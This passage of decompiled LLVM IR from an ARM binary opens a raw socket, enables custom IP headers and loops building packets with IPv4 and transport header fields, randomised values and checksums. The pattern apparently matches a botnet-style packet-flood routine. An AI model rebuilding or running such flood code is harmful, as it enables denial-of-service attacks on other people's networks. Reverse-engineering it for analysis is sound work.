  %v0_a73c = load i32, i32* @r5, align 4
  store i32 %v0_a73c, i32* %r1.global-to-local, align 4
  %v2_a740 = load i32, i32* @global_var_20600.75, align 4
  store i32 %v2_a740, i32* %r3.global-to-local, align 4
  store i32 %v6_a734, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_a74c = load i32, i32* @r4, align 4
  store i32 %v0_a74c, i32* %r0.global-to-local, align 4
  %v4_a750 = inttoptr i32 %v0_a73c to i32*
  %v5_a750 = call i32 @function_a300(i32 %v0_a74c, i32* %v4_a750, i32 25, i32 %v2_a740)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a764 = call i32 @function_10df0(i32 2, i32 3, i32 6)
  store i32 %v3_a764, i32* %r0.global-to-local, align 4
  %v7_a768 = icmp eq i32 %v3_a764, -1
  store i1 %v7_a768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a768, label %dec_label_pc_ac7c, label %dec_label_pc_a774

dec_label_pc_a774:                                ; preds = %dec_label_pc_a614
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a77c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a77c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a790 = call i32 @function_10dac(i32 %v3_a764, i32 0, i32 3, i32 %v6_a77c, i32 4)
  store i32 %v5_a790, i32* %r0.global-to-local, align 4
  %v7_a794 = icmp eq i32 %v5_a790, -1
  store i1 %v7_a794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a794, label %dec_label_pc_ac74, label %dec_label_pc_a79c

dec_label_pc_a79c:                                ; preds = %dec_label_pc_a774
  %v0_a79c = load i32, i32* @r8, align 4
  %v0_a7a0 = load i32, i32* @r7, align 4
  %v0_a7a4 = load i32, i32* %fp.global-to-local, align 4
  %v0_a7a8 = load i32, i32* @r6, align 4
  %v1_a7a8 = urem i32 %v0_a7a8, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_a7b0 = urem i32 %v0_a79c, 65536
  store i32 %v3_a7b0, i32* %r3.global-to-local, align 4
  %v3_a7b4 = urem i32 %v0_a7a0, 65536
  store i32 %v3_a7b4, i32* %r4.global-to-local, align 4
  %v0_a7b8 = load i32, i32* @sl, align 4
  %v2_a7b8 = icmp eq i32 %v0_a7b8, 0
  store i1 %v2_a7b8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_a7d0 = urem i32 %v0_a7a4, 65536
  store i32 %v3_a7d0, i32* @fp, align 4
  br i1 %v2_a7b8, label %dec_label_pc_ac88, label %dec_label_pc_a7e0

dec_label_pc_a7e0:                                ; preds = %dec_label_pc_a79c
  %v3_a7a0 = mul i32 %v0_a7a0, 65536
  %v3_a79c = mul i32 %v0_a79c, 65536
  %v0_a7a4.not = or i32 %v0_a7a4, -65536
  %v1_a7e4 = xor i32 %v0_a7a4.not, 65535
  %v3_a7e8 = mul i32 %v5_a6fc, 65536
  %v1_a7ec = add i32 %v3_a7e8, 4325376
  %tmp73 = udiv i32 %v1_a7ec, 256
  %v3_a800 = and i32 %tmp73, 65280
  %tmp74 = mul nsw i32 %v1_a7e4, 256
  %v3_a804 = and i32 %tmp74, 65280
  store i32 %v3_a804, i32* %ip.global-to-local, align 4
  %v1_a808 = add i32 %v3_a7e8, 524288
  %v1_a810 = add i32 %v3_a7e8, 1835008
  %tmp75 = udiv i32 %v1_a7e4, 256
  %v4_a814 = urem i32 %tmp75, 256
  %v5_a814 = or i32 %v4_a814, %v3_a804
  %v4_a81c = udiv i32 %v1_a7ec, 16777216
  %v5_a81c = or i32 %v3_a800, %v4_a81c
  store i32 %v5_a81c, i32* @r8, align 4
  %v3_a828 = udiv i32 %v1_a810, 256
  %tmp76 = mul i32 %v0_a7a4, 256
  %v3_a82c = and i32 %tmp76, 65280
  store i32 %v3_a79c, i32* %r2.global-to-local, align 4
  %tmp77 = udiv i32 %v0_a7a4, 256
  %v4_a83c = urem i32 %tmp77, 256
  %v5_a83c = or i32 %v4_a83c, %v3_a82c
  store i32 %v5_a83c, i32* %r0.global-to-local, align 4
  %tmp78 = mul i32 %v0_a79c, 256
  %v3_a840 = and i32 %tmp78, 65280
  %v1_a844 = and i32 %v3_a828, 65280
  store i32 %v1_a844, i32* @r6, align 4
  store i32 %v3_a7a0, i32* %r1.global-to-local, align 4
  %tmp79 = mul i32 %v0_a7a0, 256
  %v3_a850 = and i32 %tmp79, 65280
  %tmp80 = udiv i32 %v0_a79c, 256
  %v4_a854 = urem i32 %tmp80, 256
  %v5_a854 = or i32 %v4_a854, %v3_a840
  store i32 %v5_a854, i32* @lr, align 4
  %v4_a858 = udiv i32 %v1_a810, 16777216
  %v5_a858 = or i32 %v1_a844, %v4_a858
  store i32 %v5_a858, i32* %r3.global-to-local, align 4
  %tmp81 = udiv i32 %v0_a7a0, 256
  %v4_a85c = urem i32 %tmp81, 256
  %v5_a85c = or i32 %v4_a85c, %v3_a850
  %tmp82 = udiv i32 %v1_a808, 256
  %v3_a860 = and i32 %tmp82, 65280
  store i32 %v3_a860, i32* @r5, align 4
  %v5_a864 = trunc i32 %v5_a83c to i16
  %v5_a86c = trunc i32 %v5_a858 to i16
  %v4_a874 = udiv i32 %v1_a808, 16777216
  %v5_a874 = or i32 %v3_a860, %v4_a874
  store i32 %v5_a874, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %v4_a8d0 = sext i8 %v5_a668 to i32
  %v1_a8dc = trunc i32 %v5_a684 to i8
  %sext = mul nuw i32 %v5_a814, 65536
  %v4_a968 = sdiv i32 %sext, 65536
  %v2_a994 = icmp eq i32 %v1_a7a8, 0
  %sext8 = mul nuw i32 %v5_a854, 65536
  %v4_a9b4 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_a85c, 65536
  %v4_a9bc = sdiv i32 %sext9, 65536
  %v1_a97427 = trunc i32 %v4_a968 to i16
  br label %dec_label_pc_a87c

dec_label_pc_a87c:                                ; preds = %bb85, %dec_label_pc_a7e0
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a888 = call i32 @function_11958(i32 1510, i32 4)
  store i32 %v2_a888, i32* %r0.global-to-local, align 4
  %v2_a890 = load i32, i32* @r4, align 4
  %v5_a890 = mul i32 %v2_a890, 4
  %v6_a890 = add i32 %v5_a890, %v2_a630
  %v7_a890 = inttoptr i32 %v6_a890 to i32*
  store i32 %v2_a888, i32* %v7_a890, align 4
  %v3_a894 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a894, i32* %r2.global-to-local, align 4
  %v5_a89c = mul i32 %v3_a894, 24
  %v1_a8a0 = load i32, i32* @sb, align 4
  %v2_a8a0 = add i32 %v1_a8a0, %v5_a89c
  store i32 %v2_a8a0, i32* @lr, align 4
  store i32 %v2_a630, i32* %r3.global-to-local, align 4
  %v4_a8a8 = mul i32 %v3_a894, 4
  %v5_a8a8 = add i32 %v4_a8a8, %v2_a630
  %v6_a8a8 = inttoptr i32 %v5_a8a8 to i32*
  %v7_a8a8 = load i32, i32* %v6_a8a8, align 4
  store i32 %v7_a8a8, i32* %r4.global-to-local, align 4
  %v1_a8ac = inttoptr i32 %v7_a8a8 to i8*
  %v2_a8ac = load i8, i8* %v1_a8ac, align 1
  %tmp = urem i8 %v2_a8ac, 16
  %v1_a8b0 = zext i8 %tmp to i32
  %v1_a8b4 = or i32 %v1_a8b0, 64
  store i32 %v1_a8b4, i32* %r3.global-to-local, align 4
  %v1_a8b8 = trunc i32 %v1_a8b4 to i8
  store i8 %v1_a8b8, i8* %v1_a8ac, align 1
  %v0_a8bc = load i32, i32* %r4.global-to-local, align 4
  %v1_a8bc = inttoptr i32 %v0_a8bc to i8*
  %v2_a8bc = load i8, i8* %v1_a8bc, align 1
  %v1_a8c0 = and i8 %v2_a8bc, -16
  %v1_a8c4 = or i8 %v1_a8c0, 5
  store i32 %v1_a6b0, i32* %r5.global-to-local, align 4
  store i8 %v1_a8c4, i8* %v1_a8bc, align 1
  store i32 %v4_a8d0, i32* %r1.global-to-local, align 4
  %v2_a8d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_a8d4 = add i32 %v2_a8d4, 1
  %v4_a8d4 = inttoptr i32 %v3_a8d4 to i8*
  store i8 %v5_a668, i8* %v4_a8d4, align 1
  store i32 %v1_a68c, i32* %r2.global-to-local, align 4
  %v2_a8dc = load i32, i32* %r4.global-to-local, align 4
  %v3_a8dc = add i32 %v2_a8dc, 8
  %v4_a8dc = inttoptr i32 %v3_a8dc to i8*
  store i8 %v1_a8dc, i8* %v4_a8dc, align 1
  %v2_a8e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_a8e4 = add i32 %v2_a8e4, 4
  %v4_a8e4 = inttoptr i32 %v3_a8e4 to i16*
  store i16 %v5_a864, i16* %v4_a8e4, align 2
  %v2_a8ec = load i32, i32* %r4.global-to-local, align 4
  %v3_a8ec = add i32 %v2_a8ec, 9
  %v4_a8ec = inttoptr i32 %v3_a8ec to i8*
  store i8 47, i8* %v4_a8ec, align 1
  store i32 %v5_a750, i32* %r3.global-to-local, align 4
  %v0_a8f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_a8f4 = icmp eq i32 %v0_a8f4, 0
  store i1 %v2_a8f4, i1* %cpsr_z.global-to-local, align 1
  %v1_a8f8 = load i32, i32* %r4.global-to-local, align 4
  %v2_a8f8 = add i32 %v1_a8f8, 12
  %v3_a8f8 = inttoptr i32 %v2_a8f8 to i32*
  store i32 %v5_a750, i32* %v3_a8f8, align 4
  br i1 %v2_a8f4, label %.thread25, label %bb

bb:                                               ; preds = %dec_label_pc_a87c
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a900 = load i32, i32* %r4.global-to-local, align 4
  %v4_a900 = add i32 %v3_a900, 6
  %v5_a900 = inttoptr i32 %v4_a900 to i16*
  store i16 64, i16* %v5_a900, align 2
  br label %.thread25

.thread25:                                        ; preds = %dec_label_pc_a87c, %bb
  %v0_a904 = load i32, i32* @lr, align 4
  %v1_a904 = add i32 %v0_a904, 16
  %v2_a904 = inttoptr i32 %v1_a904 to i32*
  %v3_a904 = load i32, i32* %v2_a904, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_a90c = load i32, i32* %r4.global-to-local, align 4
  %v2_a90c = add i32 %v1_a90c, 16
  %v3_a90c = inttoptr i32 %v2_a90c to i32*
  store i32 %v3_a904, i32* %v3_a90c, align 4
  %v0_a910 = load i32, i32* %r4.global-to-local, align 4
  %v1_a910 = add i32 %v0_a910, 24
  store i32 %v1_a910, i32* %r1.global-to-local, align 4
  %v1_a914 = add i32 %v0_a910, 20
  store i32 %v1_a914, i32* %r0.global-to-local, align 4
  %v0_a918 = load i32, i32* %ip.global-to-local, align 4
  %v1_a918 = add i32 %v0_a918, 101
  store i32 %v1_a918, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_a924 = load i32, i32* @r8, align 4
  %v1_a924 = trunc i32 %v0_a924 to i16
  %v3_a924 = add i32 %v0_a910, 2
  %v4_a924 = inttoptr i32 %v3_a924 to i16*
  store i16 %v1_a924, i16* %v4_a924, align 2
  %v0_a928 = load i32, i32* %ip.global-to-local, align 4
  %v1_a928 = trunc i32 %v0_a928 to i16
  %v2_a928 = load i32, i32* %r0.global-to-local, align 4
  %v3_a928 = add i32 %v2_a928, 2
  %v4_a928 = inttoptr i32 %v3_a928 to i16*
  store i16 %v1_a928, i16* %v4_a928, align 2
  %v0_a92c = load i32, i32* %r3.global-to-local, align 4
  %v1_a92c = trunc i32 %v0_a92c to i8
  %v2_a92c = load i32, i32* %r1.global-to-local, align 4
  %v3_a92c = add i32 %v2_a92c, 13
  %v4_a92c = inttoptr i32 %v3_a92c to i8*
  store i8 %v1_a92c, i8* %v4_a92c, align 1
  %v0_a930 = load i32, i32* %r2.global-to-local, align 4
  %v1_a930 = trunc i32 %v0_a930 to i8
  %v2_a930 = load i32, i32* %r1.global-to-local, align 4
  %v3_a930 = add i32 %v2_a930, 12
  %v4_a930 = inttoptr i32 %v3_a930 to i8*
  store i8 %v1_a930, i8* %v4_a930, align 1
  %v0_a934 = load i32, i32* %r4.global-to-local, align 4
  %v1_a934 = add i32 %v0_a934, 38
  %v2_a934 = inttoptr i32 %v1_a934 to i8*
  %v3_a934 = load i8, i8* %v2_a934, align 1
  %tmp89 = urem i8 %v3_a934, 16
  %v1_a938 = zext i8 %tmp89 to i32
  %v1_a93c = or i32 %v1_a938, 64
  store i32 %v1_a93c, i32* %r3.global-to-local, align 4
  %v1_a940 = trunc i32 %v1_a93c to i8
  store i8 %v1_a940, i8* %v2_a934, align 1
  %v0_a944 = load i32, i32* %r4.global-to-local, align 4
  %v1_a944 = add i32 %v0_a944, 38
  %v2_a944 = inttoptr i32 %v1_a944 to i8*
  %v3_a944 = load i8, i8* %v2_a944, align 1
  %v1_a948 = and i8 %v3_a944, -16
  %v1_a94c = or i8 %v1_a948, 5
  store i8 %v1_a94c, i8* %v2_a944, align 1
  %v0_a958 = load i32, i32* %r4.global-to-local, align 4
  %v1_a958 = add i32 %v0_a958, 38
  store i32 %v1_a958, i32* @r5, align 4
  %v3_a95c = add i32 %v0_a958, 39
  %v4_a95c = inttoptr i32 %v3_a95c to i8*
  store i8 %v5_a668, i8* %v4_a95c, align 1
  store i32 %v5_a858, i32* %r2.global-to-local, align 4
  %v2_a964 = load i32, i32* @r5, align 4
  %v3_a964 = add i32 %v2_a964, 2
  %v4_a964 = inttoptr i32 %v3_a964 to i16*
  store i16 %v5_a86c, i16* %v4_a964, align 2
  store i32 %v4_a968, i32* %r3.global-to-local, align 4
  store i32 %v1_a68c, i32* %r1.global-to-local, align 4
  %v0_a970 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a970, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_a97428 = load i32, i32* @r5, align 4
  %v3_a97429 = add i32 %v2_a97428, 4
  %v4_a97430 = inttoptr i32 %v3_a97429 to i16*
  store i16 %v1_a97427, i16* %v4_a97430, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_a974 = load i32, i32* @r5, align 4
  %v3_a974 = add i32 %v2_a974, 4
  %v4_a974 = inttoptr i32 %v3_a974 to i16*
  store i16 %v1_a97427, i16* %v4_a974, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_a97c = load i32, i32* %r2.global-to-local, align 4
  %v2_a97c = trunc i32 %v1_a97c to i16
  %v3_a97c = load i32, i32* @r5, align 4
  %v4_a97c = add i32 %v3_a97c, 6
  %v5_a97c = inttoptr i32 %v4_a97c to i16*
  store i16 %v2_a97c, i16* %v5_a97c, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_a980 = load i32, i32* %r1.global-to-local, align 4
  %v1_a980 = trunc i32 %v0_a980 to i8
  %v2_a980 = load i32, i32* @r5, align 4
  %v3_a980 = add i32 %v2_a980, 8
  %v4_a980 = inttoptr i32 %v3_a980 to i8*
  store i8 %v1_a980, i8* %v4_a980, align 1
  %v0_a984 = load i32, i32* %r3.global-to-local, align 4
  %v1_a984 = trunc i32 %v0_a984 to i8
  %v2_a984 = load i32, i32* @r5, align 4
  %v3_a984 = add i32 %v2_a984, 9
  %v4_a984 = inttoptr i32 %v3_a984 to i8*
  store i8 %v1_a984, i8* %v4_a984, align 1
  %v0_a988 = call i32 @function_e7dc()
  store i32 %v0_a988, i32* %r0.global-to-local, align 4
  store i32 %v1_a7a8, i32* %r1.global-to-local, align 4
  store i1 %v2_a994, i1* %cpsr_z.global-to-local, align 1
  %v1_a998 = sub i32 1023, %v0_a988
  store i32 %v1_a998, i32* %r3.global-to-local, align 4
  br i1 %v2_a994, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_a9a0 = load i32, i32* @r5, align 4
  %v3_a9a0 = add i32 %v2_a9a0, 16
  %v4_a9a0 = inttoptr i32 %v3_a9a0 to i32*
  store i32 %v1_a998, i32* %v4_a9a0, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_a99c = load i32, i32* %r4.global-to-local, align 4
  %v2_a99c = add i32 %v1_a99c, 16
  %v3_a99c = inttoptr i32 %v2_a99c to i32*
  %v4_a99c = load i32, i32* %v3_a99c, align 4
  store i32 %v4_a99c, i32* %r3.global-to-local, align 4
  %v2_a9a4 = load i32, i32* @r5, align 4
  %v3_a9a4 = add i32 %v2_a9a4, 16
  %v4_a9a4 = inttoptr i32 %v3_a9a4 to i32*
  store i32 %v4_a99c, i32* %v4_a9a4, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_a9a8 = load i32, i32* @r5, align 4
  %v2_a9a8 = add i32 %v1_a9a8, 12
  %v3_a9a8 = inttoptr i32 %v2_a9a8 to i32*
  store i32 %v0_a988, i32* %v3_a9a8, align 4
  %v3_a9ac = load i32, i32* %stack_var_-44, align 4
  %v0_a9b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_a9b0 = add i32 %v0_a9b0, 58
  store i32 %v1_a9b0, i32* @r6, align 4
  store i32 %v4_a9b4, i32* %r2.global-to-local, align 4
  %v1_a9b8 = add i32 %v3_a9ac, 1
  store i32 %v1_a9b8, i32* @r4, align 4
  store i32 %v4_a9bc, i32* %r3.global-to-local, align 4
  %v1_a9c0 = load i32, i32* @sl, align 4
  %v9_a9c0 = icmp eq i32 %v1_a9b8, %v1_a9c0
  store i1 %v9_a9c0, i1* %cpsr_z.global-to-local, align 1
  %v0_a9c4 = load i32, i32* @r7, align 4
  %v1_a9c4 = trunc i32 %v0_a9c4 to i16
  %v3_a9c4 = add i32 %v0_a9b0, 62
  %v4_a9c4 = inttoptr i32 %v3_a9c4 to i16*
  store i16 %v1_a9c4, i16* %v4_a9c4, align 2
  %v0_a9c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a9c8 = trunc i32 %v0_a9c8 to i16
  %v2_a9c8 = load i32, i32* @r6, align 4
  %v3_a9c8 = inttoptr i32 %v2_a9c8 to i16*
  store i16 %v1_a9c8, i16* %v3_a9c8, align 2
  %v0_a9cc = load i32, i32* %r3.global-to-local, align 4
  %v1_a9cc = trunc i32 %v0_a9cc to i16
  %v2_a9cc = load i32, i32* @r6, align 4
  %v3_a9cc = add i32 %v2_a9cc, 2
  %v4_a9cc = inttoptr i32 %v3_a9cc to i16*
  store i16 %v1_a9cc, i16* %v4_a9cc, align 2
  %v0_a9d0 = load i32, i32* @r4, align 4
  store i32 %v0_a9d0, i32* %stack_var_-44, align 4
  %v5_a9d4 = icmp slt i32 %v1_a9b8, %v1_a9c0
  br i1 %v5_a9d4, label %dec_label_pc_a87c, label %dec_label_pc_a9d8

dec_label_pc_a9d8:                                ; preds = %bb85
  %v1_a9e0 = add i32 %v5_a6fc, 8
  store i32 %v1_a9e0, i32* %r4.global-to-local, align 4
  %v1_a9e4 = add i32 %v5_a6fc, 66
  store i32 %v1_a9e4, i32* %r5.global-to-local, align 4
  %v0_a9f4.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_a9f0.preheader

dec_label_pc_a9f0.preheader:                      ; preds = %dec_label_pc_a9d8, %dec_label_pc_ac88
  %v0_a9f4.pre = phi i32 [ %v0_a9f4.pre.pre, %dec_label_pc_a9d8 ], [ 0, %dec_label_pc_ac88 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_a9e4, %dec_label_pc_a9d8 ], [ %v1_ac94, %dec_label_pc_ac88 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_a9e0, %dec_label_pc_a9d8 ], [ %v1_ac90, %dec_label_pc_ac88 ]
  %v2_ac44 = icmp eq i32 %v1_a7a8, 0
  %v2_aa8c = ptrtoint i32* %stack_var_-48 to i32
  %v2_aaa4 = ptrtoint i32* %stack_var_-52 to i32
  %v2_aab4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_aac0 = ptrtoint i32* %stack_var_-54 to i32
  %v2_aad4 = icmp eq i32 %v1_a71c, 0
  %v2_aa34 = icmp eq i32 %v5_a750, -1
  %v7_aa34 = icmp eq i32 %v5_a750, -1
  br label %dec_label_pc_a9f0

dec_label_pc_a9f0:                                ; preds = %dec_label_pc_a9f0, %dec_label_pc_aadc, %dec_label_pc_a9f0.preheader
  %v0_a9f4 = phi i32 [ %v0_a9f4.pre, %dec_label_pc_a9f0.preheader ], [ 0, %dec_label_pc_a9f0 ], [ %v1_ab78, %dec_label_pc_aadc ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9f4 = icmp eq i32 %v0_a9f4, 0
  store i1 %v2_a9f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a9f4, label %dec_label_pc_a9f0, label %dec_label_pc_aa00

dec_label_pc_aa00:                                ; preds = %dec_label_pc_a9f0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_aa04

dec_label_pc_aa04:                                ; preds = %dec_label_pc_aadc, %dec_label_pc_aa00
  %v1_aa18 = phi i32 [ %v1_ab74, %dec_label_pc_aadc ], [ 0, %dec_label_pc_aa00 ]
  %v5_aa08 = mul i32 %v1_aa18, 24
  %v1_aa0c = load i32, i32* @sb, align 4
  %v2_aa0c = add i32 %v1_aa0c, %v5_aa08
  store i32 %v2_aa0c, i32* %r3.global-to-local, align 4
  store i32 %v2_a630, i32* %r4.global-to-local, align 4
  %v1_aa14 = add i32 %v2_aa0c, 20
  %v2_aa14 = inttoptr i32 %v1_aa14 to i8*
  %v3_aa14 = load i8, i8* %v2_aa14, align 1
  %v4_aa14 = zext i8 %v3_aa14 to i32
  store i32 %v4_aa14, i32* %r2.global-to-local, align 4
  %v4_aa18 = mul i32 %v1_aa18, 4
  %v5_aa18 = add i32 %v4_aa18, %v2_a630
  %v6_aa18 = inttoptr i32 %v5_aa18 to i32*
  %v7_aa18 = load i32, i32* %v6_aa18, align 4
  store i32 %v7_aa18, i32* @r5, align 4
  %v7_aa1c = icmp eq i8 %v3_aa14, 31
  store i1 %v7_aa1c, i1* %cpsr_z.global-to-local, align 1
  %v1_aa20 = add i32 %v7_aa18, 24
  store i32 %v1_aa20, i32* @r7, align 4
  %v1_aa24 = add i32 %v7_aa18, 38
  store i32 %v1_aa24, i32* @r6, align 4
  %v1_aa28 = add i32 %v7_aa18, 58
  store i32 %v1_aa28, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_aa14, 32
  br i1 %tmp90, label %dec_label_pc_ab88, label %dec_label_pc_aa30

dec_label_pc_aa30:                                ; preds = %dec_label_pc_aa04
  store i32 %v5_a750, i32* %r1.global-to-local, align 4
  store i1 %v7_aa34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa34, label %dec_label_pc_abe8, label %dec_label_pc_aa3c

dec_label_pc_aa3c:                                ; preds = %dec_label_pc_ab88, %dec_label_pc_aa30
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_aa44 = load i32, i32* @fp, align 4
  %v9_aa44 = icmp eq i32 %v0_aa44, 65535
  store i1 %v9_aa44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa44, label %dec_label_pc_ac00, label %dec_label_pc_aa4c

dec_label_pc_aa4c:                                ; preds = %dec_label_pc_abe8.dec_label_pc_aa4c_crit_edge, %dec_label_pc_aa3c
  %v1_aa50 = phi i32 [ %v1_aa50.pre, %dec_label_pc_abe8.dec_label_pc_aa4c_crit_edge ], [ 65535, %dec_label_pc_aa3c ]
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v9_aa50 = icmp eq i32 %v3_a7b0, %v1_aa50
  store i1 %v9_aa50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa50, label %dec_label_pc_ac28, label %dec_label_pc_aa58

dec_label_pc_aa58:                                ; preds = %dec_label_pc_ac00.dec_label_pc_aa58_crit_edge, %dec_label_pc_aa4c
  %v1_aa5c = phi i32 [ %v1_aa5c.pre, %dec_label_pc_ac00.dec_label_pc_aa58_crit_edge ], [ %v1_aa50, %dec_label_pc_aa4c ]
  store i32 %v3_a7b4, i32* %r3.global-to-local, align 4
  %v9_aa5c = icmp eq i32 %v3_a7b4, %v1_aa5c
  store i1 %v9_aa5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa5c, label %dec_label_pc_ac3c, label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_ac28, %dec_label_pc_aa58
  store i32 %v1_a7a8, i32* @r4, align 4
  store i1 %v2_ac44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ac44, label %dec_label_pc_ac58, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_aa64
  %v1_aa6c = load i32, i32* @r5, align 4
  %v2_aa6c = add i32 %v1_aa6c, 16
  %v3_aa6c = inttoptr i32 %v2_aa6c to i32*
  %v4_aa6c = load i32, i32* %v3_aa6c, align 4
  store i32 %v4_aa6c, i32* %r3.global-to-local, align 4
  %v2_aa70 = load i32, i32* @r6, align 4
  %v3_aa70 = add i32 %v2_aa70, 16
  %v4_aa70 = inttoptr i32 %v3_aa70 to i32*
  store i32 %v4_aa6c, i32* %v4_aa70, align 4
  br label %dec_label_pc_aa78

dec_label_pc_aa78:                                ; preds = %bb88, %.thread11, %dec_label_pc_ac58
  %v0_aa78 = call i32 @function_e7dc()
  store i32 %v0_aa78, i32* %r0.global-to-local, align 4
  store i32 %v0_aa78, i32* %stack_var_-48, align 4
  %v0_aa80 = call i32 @function_e7dc()
  store i32 %v0_aa80, i32* %r0.global-to-local, align 4
  store i32 %v0_aa80, i32* %stack_var_-52, align 4
  %v0_aa88 = call i32 @function_e7dc()
  store i32 %v2_aa8c, i32* %r1.global-to-local, align 4
  store i32 %v0_aa88, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_aa98 = load i32, i32* @r7, align 4
  store i32 %v0_aa98, i32* %r0.global-to-local, align 4
  %v3_aa9c = call i32 @function_f9ac(i32 %v0_aa98, i32 %v2_aa8c, i32 4)
  %v0_aaa0 = load i32, i32* @r7, align 4
  %v1_aaa0 = add i32 %v0_aaa0, 6
  store i32 %v1_aaa0, i32* %r0.global-to-local, align 4
  store i32 %v2_aaa4, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_aaac = call i32 @function_f9ac(i32 %v1_aaa0, i32 %v2_aaa4, i32 4)
  %v0_aab0 = load i32, i32* @r7, align 4
  %v1_aab0 = add i32 %v0_aab0, 4
  store i32 %v1_aab0, i32* %r0.global-to-local, align 4
  store i32 %v2_aab4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_aabc = call i32 @function_f9ac(i32 %v1_aab0, i32 %v2_aab4, i32 2)
  store i32 %v2_aac0, i32* %r1.global-to-local, align 4
  %v0_aac4 = load i32, i32* @r7, align 4
  %v1_aac4 = add i32 %v0_aac4, 10
  store i32 %v1_aac4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_aacc = call i32 @function_f9ac(i32 %v1_aac4, i32 %v2_aac0, i32 2)
  store i32 %v3_aacc, i32* %r0.global-to-local, align 4
  store i32 %v1_a71c, i32* %r1.global-to-local, align 4
  store i1 %v2_aad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aad4, label %dec_label_pc_aadc, label %dec_label_pc_ac64

dec_label_pc_aadc:                                ; preds = %dec_label_pc_aa78, %dec_label_pc_ac64
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_aae0 = load i32, i32* @r5, align 4
  %v3_aae0 = add i32 %v2_aae0, 10
  %v4_aae0 = inttoptr i32 %v3_aae0 to i16*
  store i16 0, i16* %v4_aae0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_aae8 = load i32, i32* @r5, align 4
  store i32 %v0_aae8, i32* @r0, align 4
  %v2_aaec = call i32 @function_cef4(i32 %v0_aae8, i32 20)
  %v3_aaec = trunc i32 %v2_aaec to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_aaf4 = load i32, i32* @r5, align 4
  %v4_aaf4 = add i32 %v3_aaf4, 10
  %v5_aaf4 = inttoptr i32 %v4_aaf4 to i16*
  store i16 %v3_aaec, i16* %v5_aaf4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_aafc = load i32, i32* %r3.global-to-local, align 4
  %v1_aafc = trunc i32 %v0_aafc to i16
  %v2_aafc = load i32, i32* @r6, align 4
  %v3_aafc = add i32 %v2_aafc, 10
  %v4_aafc = inttoptr i32 %v3_aafc to i16*
  store i16 %v1_aafc, i16* %v4_aafc, align 2
  %v0_ab00 = load i32, i32* @r6, align 4
  store i32 %v0_ab00, i32* @r0, align 4
  %v2_ab04 = call i32 @function_cef4(i32 %v0_ab00, i32 20)
  %v3_ab04 = trunc i32 %v2_ab04 to i16
  store i32 %v2_ab04, i32* %r0.global-to-local, align 4
  %v3_ab08 = load i32, i32* @r6, align 4
  %v4_ab08 = add i32 %v3_ab08, 10
  %v5_ab08 = inttoptr i32 %v4_ab08 to i16*
  store i16 %v3_ab04, i16* %v5_ab08, align 2
  store i32 0, i32* @r4, align 4
  %v0_ab10 = load i32, i32* @r8, align 4
  store i32 %v0_ab10, i32* @r1, align 4
